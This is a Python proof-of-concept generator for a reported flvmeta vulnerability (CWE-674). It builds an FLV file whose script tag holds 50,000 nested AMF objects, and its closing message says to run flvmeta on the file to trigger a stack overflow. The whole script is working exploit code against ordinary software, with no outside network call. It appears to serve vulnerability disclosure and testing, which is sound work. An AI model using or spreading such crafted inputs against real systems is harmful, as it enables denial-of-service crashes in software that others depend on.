#!/usr/bin/env python3
"""
PoC generator for VULN 001: Uncontrolled Recursion via Nested AMF Objects in flvmeta
CWE-674: Uncontrolled Recursion
"""
import struct
import os

NESTING_DEPTH = 50000
OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.flv")


def build_nested_amf(depth):
    """Build deeply nested AMF object from inside out."""
    # Innermost value: AMF number 0.0
    # type 0x00 + 8-byte IEEE 754 double (0.0)
    data = b"\x00" + b"\x00" * 8

    # Wrap in object layers from inside out
    # Each object layer: 0x03 + key("a") + value + end_marker
    # key: uint16_BE(1) + b"a"  (NO type byte)
    key = b"\x00\x01" + b"a"
    end_marker = b"\x00\x00\x09"

    for _ in range(depth):
        data = b"\x03" + key + data + end_marker

    return data


def build_flv(amf_payload):
    """Wrap AMF payload in a proper FLV file."""
    # FLV header: signature + version + flags + header_size
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size = 0
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag header fields
    tag_type = b"\x12"                       # Script tag
    data_size = struct.pack(">I", len(amf_payload))[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    timestamp_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    script_tag = (tag_type + data_size + timestamp + timestamp_ext +
                  stream_id + amf_payload)

    # previous_tag_size for script tag = 11 (tag header) + len(amf_payload)
    prev_tag_size_1 = struct.pack(">I", 11 + len(amf_payload))

    return flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1


def main():
    print(f"[*] Building {NESTING_DEPTH}-level nested AMF object...")

    # Build the nested AMF object
    nested_obj = build_nested_amf(NESTING_DEPTH)

    # AMF0 string "onMetaData": type 0x02 + uint16_BE(length) + bytes
    on_metadata = b"\x02" + struct.pack(">H", len("onMetaData")) + b"onMetaData"

    # Full AMF payload: string "onMetaData" + nested object
    amf_payload = on_metadata + nested_obj

    payload_size = len(amf_payload)
    print(f"[*] AMF payload size: {payload_size} bytes ({payload_size / 1024 / 1024:.2f} MB)")

    if payload_size > 10 * 1024 * 1024:
        print("[!] Payload > 10MB, this may be large but proceeding...")

    flv_data = build_flv(amf_payload)

    with open(OUTPUT_FILE, "wb") as f:
        f.write(flv_data)

    print(f"[*] Written to: {OUTPUT_FILE}")
    print(f"[*] FLV file size: {len(flv_data)} bytes ({len(flv_data) / 1024 / 1024:.2f} MB)")
    print("[*] Done. Run flvmeta against this file to trigger stack overflow.")


if __name__ == "__main__":
    main()
